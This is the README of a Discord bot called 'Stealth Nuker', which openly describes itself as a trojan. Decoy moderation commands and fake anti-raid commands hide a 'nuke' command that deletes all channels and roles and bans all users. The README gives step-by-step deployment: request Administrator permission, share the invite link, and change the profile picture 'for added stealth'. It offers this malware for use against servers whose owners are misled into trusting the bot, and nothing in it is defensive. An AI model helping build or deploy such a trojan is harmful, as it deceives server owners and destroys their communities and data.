# Stealth Nuker v1.0

Stealth Nuker is a python-based nuke script for discord.py. However, this nuker has a trick up its sleeve!

You see, unlike other nuke scripts, this nuke script contains some commands that are *helpful* to the server, such as your regular clear command, latency command or kick command, as well as a few commands that look as if they do something useful (but actually don't do anything). However, hidden within these commands, is a secret **nuke** command, that will destroy the server.

This way, the Stealth Nuker acts like a trojan horse rather than a typical piece of 'malicious' script; it disguises itself to be apart of the good guys.


How to install the Stealth Nuker:
-
1. Install the latest version of Python installed on your computer: https://www.python.org/downloads/
2. When installing python, you **must** check the "Add to PATH" check box.
3. Visit the releases page and install the latest version of the Stealth Nuker: https://github.com/catterall/Stealth-Nuker/releases


How to use the Stealth Nuker:
-
1. Go to https://discord.com/developers/applications.
2. Click "New Application."
3. Give the application whatever name you want your trojan bot to be called.
4. Click the "Bot" button on the side of the screen.
5. Click the "Add Bot" button.
6. Click the "OAuth2" button on the side of the screen.
7. Check the "Bot" checkbox on the "Scopes" widget.
8. Check the "Administrator" checkbox on the "Bot Permissions" widget.
9. Copy the generated link at the bottom of the "Scopes" widget and save it somewhere. **This allows users to invite your bot.**
10. Go back to the "Bot" page (Click the "Bot" button on the side of the screen).
11. Click the copy button next to the bot's profile picture display (You should change the bots profile picture for added stealth).
12. Open the `token.json` file in the stealth bot folder you installed from the releases page.
13. Replace the text that reads, "Replace this text..." with the token you copied.
14. Change the bots prefix if you wish (default prefix is `a!`).
15. Run the `run.bat` file to start the script/bot.


Commands (as of v1.0):
-
*Stealth commands (Designed to make the bot seem trust-worthy):*
- **latency:** Displays the bots latency on the given server.
- **db_add_user:** Pretends to add a user to an anti-raid database.
- **db_del_user:** Pretends to remove a user from an anti-raid database.
- **kick:** Kicks a user.
- **ban:** Bans a user.
- **clear <1-1000>:** Clears a number of messages from the current text channel.

*Malicious commands (Designed to harm the server and/or give you more power):*
- **nuke:** Deletes all channels, deletes all roles then bans all users.
